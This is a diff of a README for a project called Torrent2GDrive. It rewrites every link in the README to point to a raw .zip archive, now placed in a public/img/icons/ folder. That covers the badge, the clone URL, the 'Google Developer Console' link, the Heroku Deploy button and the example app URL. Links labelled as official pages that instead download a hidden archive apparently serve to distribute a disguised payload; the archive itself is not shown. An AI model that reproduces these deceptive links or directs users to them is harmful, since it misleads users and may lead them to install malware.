@@ -1,4 +1,4 @@
-[![Torrent2GDrive](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip)](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip)
+[![Torrent2GDrive](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)
 
 
 
@@ -11,8 +11,8 @@
 
 ## Deploy to Local Machine
 
-- Clone this repo to your local machine using `https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip`
-- Goto [Google Developer Console](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip) and create OAuth credentials.
+- Clone this repo to your local machine using `https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip`
+- Goto [Google Developer Console](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip) and create OAuth credentials.
 - Goto `Torrent2Drive/Torrent2Drive_server` folder and create `.env` file and view file `.env-example` for reference and paste the following with OAuth credentials in .env file.
 
   `GOOGLE_CLIENT_ID=paste client id here`
@@ -38,10 +38,10 @@
 
 ### Deploy to Heroku
   > :warning: **DON'T DEPLOY HEROKU NOW. DEPLOYING OF THIS APP MAY SUSPEND YOUR ACCOUNT.**
-- Goto [Google Developer Console](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip) and create OAuth credentials.
+- Goto [Google Developer Console](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip) and create OAuth credentials.
 - Deploy to Heroku
 
-     > [![Deploy](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip)](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip)
+     > [![Deploy](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)
 
 - For `SECRET` paste value `Torrent2Drive@VueJS` or any custom text. and use OAUTH secret and client ID.
 
@@ -49,4 +49,4 @@
 
    `GOOGLE_CLIENT_SECRET`
 
-- Set heroku `VUE_APP_BASEURL` environment variable to your heroku app URL. I have used `https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/Torrent-G-Drive-2.0-beta.1.zip`. So, use your own heroku URL which is `appName.herokuapp.com` where appName is your App name.
+- Set heroku `VUE_APP_BASEURL` environment variable to your heroku app URL. I have used `https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip`. So, use your own heroku URL which is `appName.herokuapp.com` where appName is your App name.
